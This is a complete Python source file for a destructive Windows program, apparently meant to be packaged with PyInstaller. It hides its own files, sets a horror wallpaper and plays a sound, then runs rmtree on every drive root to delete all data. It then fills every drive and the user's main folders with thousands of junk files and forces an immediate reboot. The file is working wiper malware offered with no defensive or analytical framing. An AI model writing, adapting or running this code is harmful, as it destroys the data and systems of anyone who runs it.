import os
import sys
import ctypes
import random
import shutil

# find disk drivers
drivers = []
driverLetters = "abcdefghijklmnopqrstuvwxyz"
for character in driverLetters:
    dPath = f"{character}:\\"
    if os.path.exists(dPath):
        drivers.append(dPath)


# asset path for pyinstaller
def assetPath(filename):
    try:
        a = sys._MEIPASS
    except:
        a = os.path.abspath(".")
    
    return os.path.join(a, filename)

# random string
def randomString(stringLen):
    value = ""
    upper = "QWERTYUIOPASDFGHJKLZXCVBNM"
    lower = upper.lower()
    numbers = "1234567890"
    strings = upper + lower + numbers

    for _ in range(0, stringLen):
        ranValue = random.randint(0, len(strings) - 1)
        value += strings[ranValue]
    
    return value


# write files
def writeFiles(path, fileLen):
    for _ in range(0, fileLen):
        filename = os.path.join(path, f"{randomString(30)}.txt")

        with open(filename, "w") as f:
            f.write(f"{randomString(1000)}")


# create files 
def createFiles():
    for disk in drivers:
        try:
            writeFiles(disk, 1000)
        except: pass
    
    # major folders
    userPath = os.path.expanduser("~")
    folders = [
        "Desktop",
        "Downloads",
        "Documents",
        "Videos",
        "Pictures",
        "Music"
    ]

    for folder in folders:
        path = os.path.join(userPath, folder)
        try:
            writeFiles(path, 1000)
        except: pass


# delete files
def deleteAllFiles():
    for disk in drivers:
        shutil.rmtree(disk, ignore_errors=True)


# opening horror sound and image and setting background
def openings():
    mainPath = os.getcwd()
    exename = os.path.basename(sys.argv[0])
    
    # hiding main file
    os.system(f"attrib +h +s +r {exename}")
    os.chdir(assetPath(""))

    # setting wallpaper
    try:
        ctypes.windll.user32.SystemParametersInfoW(20, 0, assetPath("wallpaper.jpg"), 0)
    except: pass

    # hiding our files
    for file in ["bgsong.vbs", "wallpaper.jpg", "bgsong.mp3"]:
        os.system(f"attrib +h +s +r {file}")

    # opening sound file
    os.startfile(assetPath("bgsong.vbs"))
    os.chdir(mainPath)

# main start
def main():
    # opening all files
    openings()

    # delete all files
    deleteAllFiles()

    # create random string files
    createFiles()

    # finally restart the system
    os.system("shutdown /r /f /t 0")


# boom
main()